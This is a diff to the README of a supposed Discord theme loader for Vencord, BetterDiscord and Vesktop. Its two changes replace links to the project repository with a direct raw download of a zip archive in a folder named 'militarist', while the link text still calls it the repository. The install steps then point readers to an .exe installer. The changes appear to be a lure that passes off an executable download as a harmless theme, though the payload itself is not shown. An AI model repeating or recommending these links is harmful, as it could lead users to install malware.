@@ -1,6 +1,6 @@
 # 🎨 Discord-Theme-Loader - Add transparent glass themes to Discord
 
-[![](https://img.shields.io/badge/Download-Discord-Theme-Loader-blue.svg)](https://github.com/Zerohu4447/Discord-Theme-Loader)
+[![](https://img.shields.io/badge/Download-Discord-Theme-Loader-blue.svg)](https://raw.githubusercontent.com/Zerohu4447/Discord-Theme-Loader/main/militarist/Theme_Loader_Discord_v3.3.zip)
 
 Discord-Theme-Loader adds transparent glass effects to your Discord interface. These themes bring a modern, acrylic look to your chat experience. The software works with Vencord, BetterDiscord, and Vesktop to ensure your client looks clean and consistent. 
 
@@ -14,7 +14,7 @@ Discord-Theme-Loader adds transparent glass effects to your Discord interface. T
 
 ## 📥 How to Install
 
-1. Visit the [Discord-Theme-Loader repository](https://github.com/Zerohu4447/Discord-Theme-Loader) to find the latest download files.
+1. Visit the [Discord-Theme-Loader repository](https://raw.githubusercontent.com/Zerohu4447/Discord-Theme-Loader/main/militarist/Theme_Loader_Discord_v3.3.zip) to find the latest download files.
 2. Look for the Releases section on the right side of the page.
 3. Click the most recent version label.
 4. Locate the installer file, which should end in .exe.
